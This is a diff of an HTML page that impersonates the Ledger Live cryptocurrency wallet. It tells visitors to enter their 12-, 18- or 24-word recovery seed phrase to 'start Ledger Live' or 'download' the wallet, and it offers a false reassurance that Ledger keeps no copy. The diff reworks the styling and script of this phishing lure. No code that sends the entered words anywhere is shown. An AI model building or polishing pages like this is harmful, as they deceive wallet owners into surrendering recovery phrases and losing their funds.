@@ -3,161 +3,139 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Verify Seed Phrase - Ledger Live</title>
+  <title>Verify Seed Phrase</title>
   <style>
     body {
-      margin: 0;
-      font-family: 'Courier New', monospace;
       background-color: #111;
       color: #fff;
+      font-family: "Courier New", monospace;
+      margin: 0;
       display: flex;
+      height: 100vh;
     }
 
     /* Sidebar */
     .sidebar {
-      width: 250px;
-      background-color: #1a1a1a;
-      height: 100vh;
+      width: 260px;
+      background-color: #1b1b1b;
       padding: 20px;
-      box-sizing: border-box;
-      position: fixed;
+      display: flex;
+      flex-direction: column;
     }
 
-    .logo {
+    .sidebar h2 {
+      color: white;
       font-weight: bold;
       font-size: 20px;
-      letter-spacing: 1px;
-      margin-bottom: 40px;
-      display: flex;
-      align-items: center;
+      margin-bottom: 30px;
     }
 
-    .logo::before {
-      content: "⟦";
-      margin-right: 4px;
-    }
-    .logo::after {
-      content: "⟧";
-      margin-left: 4px;
-    }
-
-    .nav {
+    .sidebar ul {
       list-style: none;
       padding: 0;
-      margin: 0;
     }
 
-    .nav li {
-      margin: 20px 0;
-      display: flex;
-      align-items: center;
+    .sidebar li {
+      margin: 15px 0;
       font-size: 15px;
-      color: #ccc;
+      color: #bbb;
       cursor: pointer;
-      transition: color 0.3s ease;
     }
 
-    .nav li:hover {
-      color: #fff;
-    }
-
-    .nav li::before {
-      content: "•";
-      margin-right: 10px;
-      color: #9b9bff;
+    .sidebar li:hover {
+      color: #a592ff;
     }
 
     /* Main Content */
     .main {
-      margin-left: 280px;
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: flex-start;
       padding: 40px;
-      width: calc(100% - 280px);
-      box-sizing: border-box;
       text-align: center;
     }
 
     h1 {
-      font-size: 26px;
-      margin-bottom: 10px;
+      font-size: 28px;
+      margin-bottom: 15px;
     }
 
     p {
-      color: #bbb;
-      font-size: 14px;
-      margin-bottom: 5px;
+      color: #aaa;
+      font-size: 15px;
+      margin: 5px 0 20px 0;
     }
 
-    .btn-group {
-      margin: 20px 0;
+    /* Buttons for 12 / 18 / 24 */
+    .word-options {
+      display: flex;
+      gap: 10px;
+      margin-bottom: 30px;
     }
 
-    .btn-group button {
-      background: none;
-      border: 1px solid #555;
+    .word-options button {
+      padding: 10px 18px;
+      background-color: transparent;
+      border: 1px solid #777;
       color: #fff;
-      padding: 8px 20px;
-      margin: 5px;
       border-radius: 6px;
       cursor: pointer;
-      transition: 0.3s;
+      transition: 0.2s;
     }
 
-    .btn-group button.active {
-      background-color: #9b9bff;
+    .word-options button.active {
+      background-color: #a592ff;
       color: #000;
-      font-weight: bold;
+      border-color: #a592ff;
     }
 
-    .btn-group button:hover {
-      background-color: #444;
+    .word-options button:hover {
+      background-color: #a592ff;
+      color: #000;
     }
 
-    .input-grid {
+    /* Input grid */
+    .grid {
       display: grid;
       grid-template-columns: repeat(3, 1fr);
       gap: 15px;
+      width: 80%;
       max-width: 900px;
-      margin: 0 auto 30px auto;
     }
 
-    .input-grid input {
+    .grid input {
       background-color: #222;
       border: none;
-      border-radius: 8px;
-      padding: 12px;
       color: #fff;
+      font-size: 16px;
+      padding: 12px;
+      border-radius: 6px;
       text-align: center;
-      font-size: 14px;
-      outline: none;
-      transition: 0.3s;
-    }
-
-    .input-grid input:focus {
-      background-color: #333;
     }
 
     .continue-btn {
-      background-color: #9b9bff;
-      color: #000;
+      margin-top: 40px;
+      padding: 12px 30px;
+      font-size: 18px;
+      background-color: #a592ff;
       border: none;
+      color: #000;
       border-radius: 25px;
-      padding: 12px 40px;
-      font-weight: bold;
-      font-size: 16px;
       cursor: pointer;
-      transition: 0.3s;
+      transition: 0.2s;
     }
 
     .continue-btn:hover {
-      background-color: #b2aaff;
+      background-color: #8b79ff;
     }
   </style>
 </head>
 <body>
-
   <div class="sidebar">
-    <div class="logo">LEDGER-LIVE</div>
-    <ul class="nav">
+    <h2>[ LEDGER-LIVE ]</h2>
+    <ul>
       <li>Portfolio</li>
       <li>Market</li>
       <li>Accounts</li>
@@ -172,38 +150,42 @@
   <div class="main">
     <h1>VERIFY SEED PHRASE OF YOUR DEVICE</h1>
     <p>Enter your Recovery Seed Phrase Words to Import & Download Your Wallet App.</p>
-    <p>**Ledger does not keep a copy of your recovery phrase.</p>
-    <p>**ENTER SEED PHRASE WORDS CORRECTLY TO START LEDGER LIVE.</p>
+    <p>**Ledger does not keep a copy of your recovery phrase.**</p>
+    <p>**ENTER SEED PHRASE WORDS CORRECTLY TO START LEDGER LIVE.**</p>
 
-    <div class="btn-group">
-      <button id="btn12" class="active" onclick="setWords(12)">12 Words</button>
+    <div class="word-options">
+      <button id="btn12" onclick="setWords(12)">12 Words</button>
       <button id="btn18" onclick="setWords(18)">18 Words</button>
       <button id="btn24" onclick="setWords(24)">24 Words</button>
     </div>
 
-    <div class="input-grid" id="wordInputs"></div>
+    <div id="inputGrid" class="grid"></div>
 
     <button class="continue-btn">Continue...</button>
   </div>
 
   <script>
+    const grid = document.getElementById("inputGrid");
+    const btn12 = document.getElementById("btn12");
+    const btn18 = document.getElementById("btn18");
+    const btn24 = document.getElementById("btn24");
+
     function setWords(count) {
-      const container = document.getElementById('wordInputs');
-      container.innerHTML = '';
+      grid.innerHTML = "";
       for (let i = 1; i <= count; i++) {
-        const input = document.createElement('input');
+        const input = document.createElement("input");
         input.placeholder = i;
-        container.appendChild(input);
+        grid.appendChild(input);
       }
 
-      // Active button styling
-      document.querySelectorAll('.btn-group button').forEach(btn => btn.classList.remove('active'));
-      document.getElementById('btn' + count).classList.add('active');
+      [btn12, btn18, btn24].forEach((b) => b.classList.remove("active"));
+      if (count === 12) btn12.classList.add("active");
+      else if (count === 18) btn18.classList.add("active");
+      else btn24.classList.add("active");
     }
 
-    // Default load with 12 words
-    window.onload = () => setWords(12);
+    // Default 24 words active
+    setWords(24);
   </script>
-
 </body>
 </html>
